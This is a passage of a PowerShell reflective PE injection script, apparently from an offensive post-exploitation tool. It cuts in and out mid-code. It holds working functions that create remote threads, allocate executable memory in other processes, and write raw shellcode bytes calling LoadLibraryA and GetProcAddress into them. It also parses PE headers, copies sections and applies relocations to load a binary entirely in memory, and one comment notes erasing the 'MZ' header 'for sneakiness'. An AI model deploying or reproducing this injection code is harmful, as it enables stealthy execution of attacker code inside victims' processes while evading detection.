            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ([Int32]$NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
